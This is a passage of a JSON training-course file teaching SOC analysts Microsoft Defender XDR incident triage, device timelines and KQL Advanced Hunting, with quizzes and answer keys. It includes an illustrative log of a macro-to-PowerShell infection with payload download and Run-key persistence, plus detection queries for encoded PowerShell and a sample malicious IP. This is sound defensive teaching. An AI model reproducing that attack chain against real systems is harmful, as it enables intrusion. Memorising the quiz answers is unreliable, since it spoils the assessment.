that user, this file hash), Defender can notice when many alerts share entities or fit a known attack sequence and group them. The next section shows what that grouped view actually looks like and what it gives you that a pile of alerts never could."
    },
    {
      "heading": "Incidents — The Correlated Attack Story",
      "content": "An **incident** is a collection of related alerts that Defender has automatically grouped because they appear to be part of the **same attack**. This is the heart of XDR and the level at which real investigation happens.\n\n### How correlation works\n\nDefender links alerts that share **entities** (the same device, user, file, or IP) or that fit a recognised **attack sequence** across products. Extending the previous example, imagine the same user's mailbox also triggered an MDO alert for a clicked phishing link an hour earlier, and MDI flagged an unusual sign-in from the same account shortly after. Those three alerts collapse into one incident:\n\n```\n{\n  \"incidentId\": \"9981\",\n  \"incidentName\": \"Multi-stage attack involving r.katz\",\n  \"severity\": \"High\",\n  \"status\": \"Active\",\n  \"classification\": null,\n  \"alerts\": [\n    { \"alertId\": \"da637812345678900030\", \"detectionSource\": \"MicrosoftDefenderForOffice365\", \"title\": \"Malicious URL clicked\" },\n    { \"alertId\": \"da637812345678900036\", \"detectionSource\": \"AzureAdIdentityProtection\", \"title\": \"Unfamiliar sign-in properties\" },\n    { \"alertId\": \"da637812345678900042\", \"detectionSource\": \"MicrosoftDefenderForEndpoint\", \"title\": \"Suspicious PowerShell command line\" }\n  ],\n  \"devices\": [\"FIN-LAPTOP-07\"],\n  \"users\": [\"r.katz\"]\n}\n```\n\nInstead of three tickets in three consoles, the analyst gets one case that already tells the story end to end: phishing click, then anomalous sign-in, then suspicious PowerShell on the user's device.\n\n**What an incident gives you:**\n\n- **The attack story / graph** — a visual and narrative map of what happened, in what order, across email, endpoint, and identity. Often the fastest way to grasp scope.\n- **All involved assets** — every device, user, and mailbox touched, so you can see how far the attack spread.\n- **Consolidated evidence and entities** — the files, processes, IPs, and URLs gathered from all member alerts in one place.\n- **A severity for the whole incident**, aggregated from its alerts, so the queue can be prioritised as *cases*, not fragments.\n\n### The triage workflow\n\nA mature Defender SOC works the **incident queue**, not the raw alert firehose. For each incident you: read the attack story to understand what happened; check the scope (which users and devices); confirm whether it is a true positive; contain (isolate a device, disable or reset an account, purge mail); and classify and close, feeding the outcome back to improve detections.\n\nThe mental shift to make is this: **alerts are evidence; the incident is the case.** Working at the incident level is what lets one analyst understand a multi-stage, multi-product attack quickly — and it is only possible because each underlying alert named its entities clearly enough to be correlated."
    },
    {
      "heading": "Automated Investigation and Response (AIR)",
      "content": "Not every step of triage has to wait for a human. **Automated Investigation and Response (AIR)** is a capability in Microsoft Defender for Endpoint (and integrated across XDR) that automatically investigates certain alerts the moment they fire, and can take remediation action without an analyst clicking anything first.\n\n### How it works\n\nWhen a supported alert triggers AIR, it runs a playbook that mirrors what a human analyst would do: it examines the affected entities (files, processes, persistence mechanisms), checks them against threat intelligence, and expands outward — for example, checking whether the same malicious file exists on other devices in the org. It then produces a **verdict** (malicious, suspicious, or no threat found) for each piece of evidence it examined.\n\n### Remediation actions and approval\n\nBased on the verdict, AIR can take **remediation actions** — quarantining a file, killing a process, removing a registry persistence key, or stopping a service. Depending on how the tenant is configured, these actions can be **fully automatic**, or they can require **analyst approval** before executing, sitting in a pending-actions queue. Requiring approval is common in environments still building trust in the automation, or where certain actions (like isolating a production server) carry real business risk.\n\n### Where the analyst fits in\n\nAIR does not replace the analyst; it removes the repetitive first pass so the analyst's time goes to judgment calls. In practice, you will open an incident and find an **investigation graph** already attached, showing what AIR examined, what it concluded, and what it did or is waiting to do. Your job is to review that graph, approve or reject any pending actions, and decide whether the automated remediation was sufficient or whether the incident needs deeper manual hunting — for instance, if AIR only found and removed the file on one device, but your own review of the incident's device list shows the same user signed into three others.\n\n**Why the SOC cares:** AIR is what makes a high alert volume survivable. It compresses the routine verdict-and-remediate cycle for well-understood threats from minutes of manual work down to seconds of automated action, freeing analyst attention for the alerts and incidents that genuinely need a human's judgment — which is most of what the rest of this lesson, and the next one on hunting, is about."
    },
    {
      "heading": "Device Timeline — Reconstructing What Happened on a Machine",
      "content": "When an incident points at a specific device, the **device timeline** in Microsoft Defender for Endpoint lets you reconstruct, in chronological order, exactly what that machine did. It is the microscope you reach for after the incident graph has shown you *which* device to examine.\n\n### What the timeline shows\n\nFor a given device, MDE continuously records rich behavioural telemetry and presents it as a time-ordered stream of events:\n\n- **Process events** — what programs ran, their command lines, and crucially their **parent-child relationships** (which process launched which).\n- **File events** — files created, modified, or deleted.\n- **Network events** — connections the device made and to where.\n- **Registry and logon events** — configuration changes and sign-ins.\n\nBecause these are laid out on a single timeline, you can start from a known bad moment — say, the instant an alert fired — and scroll **backwards** to see what led up to it and **forwards** to see what followed.\n\n### A worked pattern\n\nSuppose the FIN-LAPTOP-07 incident from earlier flags a malicious file. The timeline, read in order, might look like this:\n\n```\n13:00:47  FileCreated       WINWORD.EXE writes Invoice_88213.docm to Downloads\n13:00:52  ProcessCreated    WINWORD.EXE launches powershell.exe (child)\n13:00:53  ProcessCreated    powershell.exe command line: -enc SQBFAFgA...\n13:00:55  NetworkConnection powershell.exe -> 185.203.x.x:443 (TLS)\n13:00:58  FileCreated       powershell.exe writes update.exe to %TEMP%\n13:01:02  ProcessCreated    update.exe launched by powershell.exe\n13:01:10  RegistryModified  update.exe adds Run key HKCU\\...\\Software\\Run\\SysHelper\n```\n\nWalking this timeline answers the questions that matter in an investigation. *How did this get here?* A Word document (`WINWORD.EXE`) spawned PowerShell — the classic signature of a malicious macro, revealing **initial access** via phishing and the **execution** technique. *What did it do next?* PowerShell reached out over the network and dropped a second file, `update.exe` — revealing **command and control** and a **payload drop**. *Did it try to stay?* The new Run key is a **persistence** mechanism, telling you the malware intends to survive a reboot.\n\n### Why it matters for the SOC\n\nThe timeline is where root-cause analysis actually happens. The incident tells you *that* a device was involved and roughly how; the timeline tells you the precise *sequence* — the patient-zero action, the execution chain, and the blast radius. It also feeds your response: knowing exactly what ran and what it touched tells you whether isolating the device is enough or whether you must hunt the same pattern — the same command line, the same registry key, the same C2 IP — on other machines, which is a job for Advanced Hunting, the next lesson. In short: incidents give you the story, and the device timeline gives you the frame-by-frame proof."
    },
    {
      "heading": "Severity, Classification, and Closing the Loop",
      "content": "An incident is not truly finished until it has been **classified and closed**, and doing this consistently is what keeps an incident queue useful over time rather than a graveyard of stale, unresolved cases.\n\n### Severity vs. classification vs. determination\n\nThese three fields are often confused, so keep them distinct. **Severity** (Informational through High) is Defender's *automated* estimate of how dangerous the incident looks, based on the alerts inside it — it is a triage priority, not a final verdict. **Classification** is the analyst's *human* judgment once investigated: **True positive**, **False positive**, or **Informational, expected activity**. **Determination** is a further, more specific reason code attached to a true positive — for example *malware*, *phishing*, *compromised account*, or *security testing* — that records *why* it was true, which matters enormously for later reporting and metrics.\n\n### Why disciplined classification matters\n\nEvery classification you set trains the system and the team. A pattern marked **false positive** repeatedly can inform tuning of the detection that keeps firing on it, reducing future noise. A pattern marked **true positive** with a specific determination feeds metrics like \"how many BEC attempts did we see this quarter\" that leadership and compliance actually use. Skipping this step, or classifying everything as true positive without a determination, throws that value away.\n\n### The closing checklist\n\nBefore closing an incident, a disciplined analyst confirms: every involved device and user has been remediated or explicitly assessed as unaffected; any pending AIR actions have been approved or rejected; the classification and determination are set; and a brief comment records what happened and what was done, for the next analyst who might see a related incident later. Microsoft Defender lets you attach comments and tags to an incident precisely so this institutional memory persists rather than living only in one analyst's head.\n\n**Why the SOC cares:** the incident queue is the SOC's single source of truth for \"what happened and what did we do about it.\" An analyst who closes incidents cleanly, with accurate severity, classification, and determination, is not just finishing a task — they are building the dataset every future detection tuning decision, every audit, and every metric the SOC reports on will depend on."
    }
  ],
  "keyTakeaways": [
    "Microsoft Defender XDR unifies signals from MDE (endpoint), MDO (email), MDI (identity/AD), MDCA (cloud apps), and Entra ID Protection into one portal (security.microsoft.com), correlating across products rather than siloing alerts.",
    "An alert is a single detection (title, severity, status, entities, MITRE technique, source) and is only a fragment; triaging alerts one at a time in isolation is how real attacks hide in the noise.",
    "An incident automatically groups related alerts that share entities or fit an attack sequence into one case, providing the attack story/graph, all involved assets, and consolidated evidence — so mature SOCs work the incident queue, not the raw alert firehose.",
    "Automated Investigation and Response (AIR) runs playbooks on supported alerts, produces verdicts, and can remediate automatically or pending approval — freeing analyst time for judgment calls rather than repetitive first-pass triage.",
    "The MDE device timeline reconstructs a machine's events chronologically (process trees, file/network/registry/logon), letting you walk backward to root cause and forward to blast radius, and closing an incident cleanly requires setting severity, classification, and a specific determination for future metrics and tuning."
  ],
  "quiz": [
    {
      "question": "In Microsoft Defender XDR, what fundamentally distinguishes an 'incident' from an 'alert', and why does working at the incident level matter for a SOC analyst?",
      "options": [
        {
          "label": "An incident is a lower-severity version of an alert, so analysts work the alert queue first and only review incidents when they have spare time between cases.",
          "value": "a"
        },
        {
          "label": "An incident is a collection of related alerts auto-grouped as one attack, giving the correlated story and scope that individual alert fragments cannot provide on their own.",
          "value": "b"
        },
        {
          "label": "An incident is a single detection from one product, while an alert always spans several products, so alerts are the broader and more useful unit to triage.",
          "value": "c"
        },
        {
          "label": "An incident and an alert are identical in Defender; the two words are interchangeable labels for the same object shown in different parts of the portal.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "An incident is a set of related alerts that Defender automatically correlates (by shared entities or attack sequence) into one case, providing the end-to-end attack story and scope that isolated alerts cannot, which is why mature SOCs triage at the incident level. Option a inverts severity and workflow. Option c reverses the definitions — the alert is the single detection, not the incident. Option d is false because the two are distinct objects."
    },
    {
      "question": "An incident flags a malicious executable on a laptop. You open the device timeline and want to determine how the file got there. Which capability of the timeline most directly reveals the root cause?",
      "options": [
        {
          "label": "The alert severity score, because a High rating on the timeline automatically identifies which phishing email delivered the file to the device.",
          "value": "a"
        },
        {
          "label": "The chronological process tree showing parent-child relationships, letting you walk back to see, for example, a Word document spawning PowerShell that fetched the file.",
          "value": "b"
        },
        {
          "label": "The incident's aggregated severity, because summing the severities of all member alerts pinpoints the exact process that first wrote the malicious file to disk.",
          "value": "c"
        },
        {
          "label": "The list of other devices in the incident, because comparing device names alone reveals which machine originally created and distributed the executable.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The device timeline records events chronologically with process parent-child relationships, so you can walk backward from the malicious file to the process tree that produced it — for example a Word document spawning PowerShell that downloaded it — revealing initial access and execution. Option a is wrong because a severity score does not identify a delivery email. Options c and d describe aggregated severity and device lists, which do not reconstruct the on-device execution chain that the timeline's process tree provides."
    },
    {
      "question": "AIR automatically investigates an alert, concludes a file is malicious, and queues a remediation action pending analyst approval. What is the analyst's most appropriate role at this point?",
      "options": [
        {
          "label": "Ignore the pending action entirely, since AIR's verdicts always execute automatically regardless of whether an analyst reviews them.",
          "value": "a"
        },
        {
          "label": "Review the investigation graph and evidence, then approve or reject the action, checking whether the same threat exists on other devices AIR did not examine.",
          "value": "b"
        },
        {
          "label": "Manually redo the entire investigation from scratch without looking at anything AIR produced, since automated findings can never be trusted in any case.",
          "value": "c"
        },
        {
          "label": "Immediately close the incident as resolved, because a pending AIR action means the threat has already been fully remediated across the environment.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "When AIR queues an action for approval, the analyst's job is to review its investigation graph and evidence, approve or reject the action, and check for related activity on other devices AIR may not have covered. Option a contradicts the fact that approval is required before the action executes. Option c wastes the value AIR provides by discarding its findings unnecessarily. Option d is wrong because a pending action has not yet executed and does not mean remediation is complete."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-xdr/microsoft-365-defender",
    "https://learn.microsoft.com/en-us/defender-xdr/incidents-overview",
    "https://learn.microsoft.com/en-us/defender-endpoint/investigate-machines",
    "https://learn.microsoft.com/en-us/defender-endpoint/automated-investigations",
    "https://learn.microsoft.com/en-us/defender-xdr/manage-incidents"
  ],
  "xp": 240,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-advanced-hunting-kql-defender",
  "slug": "advanced-hunting-with-kql-in-defender",
  "title": "Advanced Hunting with KQL in Microsoft Defender",
  "topic": "Microsoft Security",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Alerts and incidents tell you about things Defender already decided are suspicious. But some of the most important SOC work is proactive: forming a hypothesis about how an attacker might operate and searching the raw telemetry to see whether it is happening, before any alert fires. In Microsoft Defender, that proactive search is called Advanced Hunting, and it is powered by a query language called KQL — Kusto Query Language. This lesson assumes you have never written a query language before. It starts from the absolute basics of what a query language even is, builds up KQL operator by operator with runnable examples, tours the real schema tables an analyst uses daily, works through multi-step hunts that join across tables the way a real investigation does, covers the pitfalls that make queries slow or wrong, and finishes with how a good hunting query becomes a permanent custom detection.",
  "sections": [
    {
      "heading": "What Advanced Hunting Is",
      "content": "**Advanced Hunting** is a query-based tool in the Microsoft Defender portal that lets you search across the **raw telemetry** collected from endpoints, email, identities, and cloud apps — typically the last **30 days** of events. Where an alert is Defender telling *you* something is wrong, Advanced Hunting is *you* asking Defender a precise question and getting back every matching event.\n\nThe distinction between **reactive** and **proactive** work is the heart of it:\n\n- **Reactive**: you respond to alerts and incidents that the platform generated. Essential, but by definition limited to what the built-in detections catch.\n- **Proactive (hunting)**: you start from a hypothesis — \"an attacker in our environment would probably run `whoami` right after landing,\" or \"they might use a renamed copy of a system tool\" — and you query the telemetry directly to test it. Hunting finds the things detections missed.\n\nAdvanced Hunting is where a hypothesis meets evidence. Because it queries the same underlying data that feeds alerts, you can look for faint patterns that never crossed an alert threshold: a single unusual process, a rare parent-child relationship, one user's odd sign-in pattern. It is also how you **scope an incident** — once you know an attacker's technique from one machine, you hunt the same pattern everywhere to find every affected host.\n\nThe tool is built on **KQL — Kusto Query Language** — a read-only language designed for fast searching and filtering of huge event tables. If you have never written a query before, do not worry: the next section starts from zero, before assuming any prior syntax knowledge at all. The payoff is real analyst power: the ability to answer, in seconds, questions the built-in detections were never written to ask."
    },
    {
      "heading": "From Zero: What a Query Language Actually Is",
      "content": "If you have only ever used a search box — typing a word into Google, or Ctrl+F in a document — the leap to a language like KQL feels bigger than it is. A **query language** is simply a precise, structured way of asking a computer to find and shape data, instead of a fuzzy keyword search. Think of the difference between asking a librarian \"do you have anything about dogs?\" versus \"give me every book published after 2015, about dogs, sorted by title, but only show me the author and year.\" The second request is a query: specific conditions, specific output, specific order. KQL is how you phrase that second kind of request to Microsoft's telemetry.\n\n### The mental model: a table, and a pipeline of steps\n\nEvery piece of telemetry in Advanced Hunting lives in a **table** — think of it exactly like a spreadsheet, with rows (one per event) and columns (one per piece of information about that event, like the time, the device name, or the command line). A KQL query always starts by naming a table, and then describes a series of steps to narrow down and reshape its rows, one step at a time, connected by a pipe character `|` — the same symbol used in many command-line tools, meaning \"take the output of the last step and feed it into the next one.\"\n\nSo a query is read top to bottom, like a recipe:\n\n```\nDeviceProcessEvents\n| where FileName == \"powershell.exe\"\n```\n\nIn plain English: *\"Start with the DeviceProcessEvents table (every process that ran on every device). Keep only the rows where the FileName column equals powershell.exe.\"* That is the entire mental model you need before learning any more syntax: **name a table, then pipe it through steps that filter, reshape, or summarise it.** Every query in this lesson, no matter how long, is built from that same repeating pattern.\n\n### A note on comparison and text matching\n\nKQL uses `==` to test exact equality (case-sensitive by default for strings), `!=` for not-equal, and operators like `contains`, `startswith`, and `has` for text matching — `contains` looks for a substring anywhere, while `has` looks for a whole \"word\" and is faster on large tables because of how the data is indexed internally. You will see all of these in the worked examples ahead. With this foundation in place, the next section adds the small set of operators that, in combination, cover the overwhelming majority of real hunting work."
    },
    {
      "heading": "Enough KQL to Be Dangerous",
      "content": "With the table-and-pipeline model from the previous section, here is the operator toolkit that carries you through most real hunts. Each one takes the rows coming in from the left of the `|` and produces a new, transformed set of rows going out.\n\n**The core operators:**\n\n- **`where`** — filter to the rows you care about. `where FileName == \"powershell.exe\"` keeps only PowerShell events.\n- **`project`** — choose which columns to show, like selecting fields, and optionally rename them. `project Timestamp, DeviceName, FileName`.\n- **`extend`** — add a new computed column without removing the existing ones, useful for deriving a value you want to filter or display later.\n- **`summarize`** — aggregate: count, group, find min/max. `summarize count() by DeviceName` gives a per-device tally; `summarize Count = count() by DeviceName, FileName` groups by more than one column and names the result column.\n- **`sort by` / `order by`** — order results (they are interchangeable in KQL); add `desc` or `asc`.\n- **`top`** — take the N most extreme rows by some column in one step. `top 10 by Timestamp`.\n- **`distinct`** — list only the unique values of one or more columns, useful for a quick \"what are all the values I might see here.\"\n- **`let`** — define a named value or list once at the top of a query and reuse it, keeping long queries readable.\n- **`join`** — combine two tables on a shared column, so you can, for example, link a process event to the sign-in that preceded it.\n\nA real query stacks several of these. Read this one as a sentence:\n\n```\nDeviceProcessEvents\n| where Timestamp > ago(24h)\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine contains \"-enc\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n```\n\nIt says: *from process events, in the last 24 hours, find PowerShell runs whose command line contains `-enc` (encoded commands, a common attacker tell), show me the time, device, account, and full command line, newest first.* The helper `ago(24h)` means \"24 hours ago,\" and time filters like this belong near the top of nearly every query because they make it fast.\n\nHere is a second worked example using `summarize`, answering \"which devices ran the most PowerShell in the last day\":\n\n```\nDeviceProcessEvents\n| where Timestamp > ago(24h)\n| where FileName == \"powershell.exe\"\n| summarize PowerShellCount = count() by DeviceName\n| sort by PowerShellCount desc\n| top 10 by PowerShellCount\n```\n\nTwo habits make hunting effective. First, **filter early and narrowly** — put your most selective `where` clauses first so the query scans less data before doing expensive work like `join` or `summarize`. Second, **project only what you need**, so results are readable. From here, the same handful of operators — `where`, `project`, `extend`, `summarize`, `sort`, `distinct`, `let`, `join` — will carry you through the overwhelming majority of real hunts. The skill that remains is knowing *which table* holds the data you want, which is the next section."
    },
    {
      "heading": "The Schema — Knowing Which Table to Query",
      "content": "Advanced Hunting organises telemetry into **schema tables**, each holding one kind of event. Knowing which table answers which question is the difference between hunting fluently and staring at a blank query box. The tables group naturally by sensor.\n\n**Endpoint (from Defender for Endpoint):**\n\n- **DeviceProcessEvents** — processes that ran, with command lines and parent-child links. The workhorse for execution and living-off-the-land hunts.\n- **DeviceNetworkEvents** — network connections a device made (useful for C2 and exfil).\n- **DeviceFileEvents** — file create/modify/delete.\n- **DeviceLogonEvents** — sign-ins to devices.\n- **DeviceRegistryEvents** — registry changes (persistence).\n\n**Email (from Defender for Office 365):**\n\n- **EmailEvents** — one row per message (sender, recipient, verdicts, delivery action).\n- **EmailAttachmentInfo** / **EmailUrlInfo** — attachments and URLs in messages.\n- **UrlClickEvents** — Safe Links click records (who clicked what, when).\n\n**Identity (from Defender for Identity and Entra):**\n\n- **IdentityLogonEvents** — authentication activity across AD and cloud.\n- **IdentityDirectoryEvents** / **IdentityQueryEvents** — directory changes and reconnaissance queries (for example, BloodHound-style enumeration).\n- **AADSignInEventsBeta** — Microsoft Entra ID sign-in activity surfaced directly in Advanced Hunting.\n\n**Cloud apps and alerts:**\n\n- **CloudAppEvents** — activity in connected cloud apps.\n- **AlertInfo** / **AlertEvidence** — the alerts themselves and the entities tied to them, so you can pivot from a hunt to related alerts.\n\nThe practical skill is **mapping a question to a table**. \"Did anyone run a suspicious PowerShell command?\" points to **DeviceProcessEvents**. \"Who clicked this phishing link?\" points to **UrlClickEvents**. \"Was there unusual directory reconnaissance?\" points to **IdentityQueryEvents**. \"Which devices connected to this malicious IP?\" points to **DeviceNetworkEvents**. \"Did this user sign in from an unfamiliar location?\" points to **AADSignInEventsBeta**.\n\nThe real power comes from **joining across tables**, because that mirrors how attacks actually cross domains — a single query can link an email event to a click event to a process event, reconstructing a whole initial-access chain from three sensors at once. The next section works through exactly that kind of multi-table hunt in full."
    },
    {
      "heading": "Worked Multi-Step Hunts",
      "content": "Real investigations rarely stop at one table. Here are two complete, realistic hunts that combine everything covered so far.\n\n### Hunt 1: from a phishing click to on-device execution\n\nThe hypothesis: a user who clicked a phishing link a few minutes ago may have had malware run on their device shortly afterward. This links **UrlClickEvents** to **DeviceProcessEvents** through the account and a tight time window.\n\n```\nlet SuspiciousClicks = UrlClickEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"ClickAllowed\"\n| project ClickTime = Timestamp, AccountUpn, Url;\nSuspiciousClicks\n| join kind=inner (\n    DeviceProcessEvents\n    | project ProcTime = Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine\n) on $left.AccountUpn == $right.AccountName\n| where ProcTime between (ClickTime .. ClickTime + 15m)\n| project ClickTime, AccountUpn, Url, ProcTime, DeviceName, FileName, ProcessCommandLine\n| sort by ClickTime desc\n```\n\nRead it as: *define a named result, SuspiciousClicks, of every allowed click in the last day; join it to process events on the same account; keep only processes that started within 15 minutes after the click; show the click and the process side by side.* The `let` statement here does exactly what it did conceptually before — names an intermediate result so the final query reads cleanly — and the time-window join (`between`) is what turns two unrelated tables into a causal-looking sequence worth investigating.\n\n### Hunt 2: hunting for a known bad indicator across every sensor\n\nThe hypothesis: threat intelligence just gave you a malicious IP address, and you want to know everywhere it appears — network connections, and any related alerts already raised.\n\n```\nlet BadIP = \"185.203.118.44\";\nDeviceNetworkEvents\n| where RemoteIP == BadIP\n| where Timestamp > ago(7d)\n| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort\n| union (\n    AlertEvidence\n    | where RemoteIP == BadIP\n    | project Timestamp, DeviceName, AlertId, RemoteIP, RemotePort = int(null)\n)\n| sort by Timestamp desc\n```\n\nThis uses `union` (stacking the rows of two queries with compatible columns into one result) to show, in a single timeline, every raw network connection to the bad IP *and* every existing alert that already mentions it — telling you immediately whether this is a brand-new finding or something Defender already flagged and you are now scoping further.\n\n### The pattern to internalise\n\nBoth hunts follow the same shape as the phishing walkthrough in the MDO lesson: pick a starting fact (a click, an indicator), find the table that captures the *next* thing an attacker would need to do, and join or union across the time or entity that connects them. That repeatable shape — start narrow, connect tables on a shared entity or time window, widen only as far as the evidence supports — is what separates a focused hunt from an unfocused fishing expedition through terabytes of data."
    },
    {
      "heading": "Common Pitfalls and Query Performance",
      "content": "KQL is forgiving to learn but easy to write inefficiently, and a slow or wrong query can cost you minutes during a live incident. A few habits separate a query that returns in seconds from one that times out or, worse, quietly returns the wrong answer.\n\n### Pitfalls that produce wrong results\n\n- **Forgetting the time filter.** Every table defaults to scanning a very large window if you do not constrain it with `where Timestamp > ago(...)`. Omitting this is the single most common mistake — the query becomes both slow and hard to reason about.\n- **Case sensitivity surprises.** `==` on strings is case-sensitive; `FileName == \"PowerShell.exe\"` will *not* match a row recorded as `powershell.exe`. Use `=~` for case-insensitive equality, or normalise with `tolower()` when comparing.\n- **`contains` vs `has` mismatches.** `contains \"exe\"` will match `\"myexecutable.dll\"` because it matches any substring; `has \"exe\"` matches only when `exe` appears as a distinct term, which is usually what you actually want and is also faster.\n- **Join column type or name mismatches.** A `join` silently returns zero rows if the two sides do not actually share matching values (for example, one side stores an account as `DOMAIN\\user` and the other as `user@domain.com`), and a silently-empty hunt looks identical to \"nothing bad happened\" — always sanity-check with a `count()` on each side before trusting an empty join result.\n\n### Habits that keep queries fast\n\n- **Filter early, filter narrow.** Put the `where` clauses that eliminate the most rows first, and always constrain time before anything else — the engine scans far less data if you tell it *when* to look before *what* to look for.\n- **Project before you join or summarize.** Dropping unneeded columns with `project` before an expensive operation reduces how much data KQL has to shuffle around.\n- **Prefer `has` over `contains` on large text fields** like command lines, when a whole-word match is good enough — the underlying index makes `has` meaningfully faster at scale.\n- **Test on a short time window first.** Validate the logic of a new query against `ago(1h)` before widening to `ago(30d)`; a mistake that returns ten wrong rows is easy to catch, one that returns ten thousand is not.\n\n**Why the SOC cares:** during a live incident, the cost of a slow or subtly wrong query is not just your own time — it is delayed containment while a real attacker is still active. Building these habits into muscle memory is what lets a hunt finish in the minutes an incident actually gives you, rather than the unhurried afternoon you had while practising."
    },
    {
      "heading": "From Hunt to Custom Detection",
      "content": "A hunting query's life does not have to end when you close the tab. One of the most valuable things a SOC does is turn a good hunt into a **custom detection rule** — a saved query that Defender runs automatically on a schedule and that raises an alert (and can trigger response) whenever it finds a match. This is how a one-time discovery becomes permanent, automated coverage.\n\n**The workflow:**\n\n1. **Hunt** — write and refine a KQL query, applying the performance and correctness habits from the previous section, until it reliably surfaces the malicious pattern you care about with few false positives.\n2. **Tune** — make sure the results are clean. A detection that fires constantly on benign activity is worse than none, because it trains analysts to ignore it. Add `where` clauses that exclude known-good behaviour, such as an approved admin script's exact command line.\n3. **Create the custom detection** — save the query as a rule, set how often it runs, choose the alert severity and title, and map the **entities** (device, user, file) the rule returns so the resulting alerts correlate into incidents properly.\n4. **Add response actions** — optionally, have the rule automatically isolate a device, run an antivirus scan, or mark a user as compromised when it fires.\n\nThe result is a feedback loop that steadily improves the SOC: analysts hunt for what the built-in detections miss, and the best hunts graduate into custom detections that catch the same thing automatically next time — freeing analysts to hunt for the *next* gap. This is **detection engineering** in miniature, and Advanced Hunting is the workbench where it happens.\n\nA few principles keep it healthy. **Ground hunts in real techniques** — MITRE ATT&CK is an excellent source of hypotheses, since each technique suggests a concrete query (\"how would I see T1059 PowerShell execution in DeviceProcessEvents?\"). **Prefer robust logic over brittle string matches** — hunting for a behaviour (a system tool spawning from an unusual parent) generalises better than matching one malware's exact filename. And **document what a detection is meant to catch**, so the next analyst understands why an alert fired. Done well, the hunt-to-detection loop is what turns a reactive alert-triage team into a proactive one that closes its own blind spots."
    }
  ],
  "keyTakeaways": [
    "Advanced Hunting is a query-based tool over ~30 days of raw Defender telemetry (endpoint, email, identity, cloud) for proactive, hypothesis-driven hunting — finding what built-in detections miss and scoping incidents across all hosts.",
    "KQL is a table-and-pipeline language: name a table, then pipe rows through operators separated by |. The core operators where (filter), project (choose columns), extend (add columns), summarize (aggregate), sort/top, distinct, let (name a value), and join cover most hunts — filter early and narrowly, project only what you need.",
    "Knowing which schema table answers which question is essential: DeviceProcessEvents (execution), DeviceNetworkEvents (C2/exfil), EmailEvents/UrlClickEvents (phishing/clicks), IdentityLogonEvents/IdentityQueryEvents/AADSignInEventsBeta (auth/recon), AlertInfo/AlertEvidence — and joining or unioning tables reconstructs cross-domain attack chains.",
    "Common pitfalls include missing time filters, case-sensitive == mismatches, contains vs has confusion, and silent zero-row joins from mismatched account formats — filtering early, projecting before expensive operations, and testing on a short window first keep hunts fast and correct.",
    "A well-tuned hunt should graduate into a custom detection rule that runs automatically, raises correlated alerts, and can trigger response — closing the hunt-to-detection loop; ground hunts in MITRE ATT&CK and prefer behavioural logic over brittle string matches."
  ],
  "quiz": [
    {
      "question": "What is the essential difference between responding to Defender alerts and using Advanced Hunting, and why does hunting add value a purely alert-driven SOC lacks?",
      "options": [
        {
          "label": "Advanced Hunting only re-displays existing alerts in a table, so it adds convenience but cannot surface anything the built-in detections did not already flag.",
          "value": "a"
        },
        {
          "label": "Advanced Hunting lets you query raw telemetry to test your own hypotheses, finding faint patterns that never crossed an alert threshold — proactive rather than reactive work.",
          "value": "b"
        },
        {
          "label": "Advanced Hunting automatically resolves every alert without analyst input, so its value is eliminating triage rather than discovering any new malicious activity.",
          "value": "c"
        },
        {
          "label": "Advanced Hunting can only search data older than one year, so its sole purpose is long-term compliance archiving rather than active threat detection.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Advanced Hunting queries the raw telemetry directly so you can test your own hypotheses and surface faint patterns that never triggered an alert — proactive hunting that finds what built-in detections miss, unlike purely reactive alert triage. Option a is wrong because hunting searches raw events, not just existing alerts. Option c invents auto-resolution that does not exist. Option d misstates the retention (typically ~30 days) and purpose."
    },
    {
      "question": "You have refined a KQL query that reliably detects a specific malicious PowerShell pattern with very few false positives. What is the best next step to get lasting value from it, and what must you be careful about?",
      "options": [
        {
          "label": "Run the query manually once each morning forever, because Defender cannot save or schedule hunting queries and there is no way to automate a detection.",
          "value": "a"
        },
        {
          "label": "Save it as a scheduled custom detection rule so it raises correlated alerts automatically, being careful to tune out benign matches so it does not become noisy.",
          "value": "b"
        },
        {
          "label": "Broaden the query to match as many processes as possible before saving it, since a detection that fires on more events is always more useful to the SOC.",
          "value": "c"
        },
        {
          "label": "Delete the query after the current investigation, because hunting logic should never be reused and each incident requires writing detections entirely from scratch.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A well-tuned hunt should graduate into a scheduled custom detection rule that automatically raises correlated alerts (and can trigger response), with careful tuning so it does not fire on benign activity — a noisy detection trains analysts to ignore it. Option a is wrong because Defender does support saved, scheduled custom detections. Option c is dangerous advice, since over-broad detections create alert fatigue. Option d discards reusable value that the hunt-to-detection loop is designed to capture."
    },
    {
      "question": "A query using where FileName == \"PowerShell.exe\" returns zero results, even though you can see powershell.exe processes in the portal. What is the most likely cause, and how would you fix it?",
      "options": [
        {
          "label": "KQL string comparisons with == are case-sensitive by default, so the query should use =~ for case-insensitive equality or normalise the value with tolower().",
          "value": "a"
        },
        {
          "label": "The DeviceProcessEvents table only stores events older than one year, so any recent PowerShell activity is never queryable through Advanced Hunting.",
          "value": "b"
        },
        {
          "label": "The where operator can only filter numeric columns, so filtering on a text column like FileName always silently returns zero rows regardless of case.",
          "value": "c"
        },
        {
          "label": "KQL requires every query to include a join before any where clause, so a single-table filter like this one always fails to execute correctly.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "KQL's == operator is case-sensitive for strings, so \"PowerShell.exe\" will not match a row recorded as \"powershell.exe\"; using =~ for case-insensitive equality or normalising with tolower() fixes it. Option b misstates retention, which is roughly 30 days, not restricted to old data. Option c is false — where filters text columns constantly and correctly when case matches. Option d invents a join requirement that does not exist; simple single-table filters are valid and common."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-overview",
    "https://learn.microsoft.com/en-us/kusto/query/",
    "https://learn.microsoft.com/en-us/defender-xdr/custom-detections-overview",
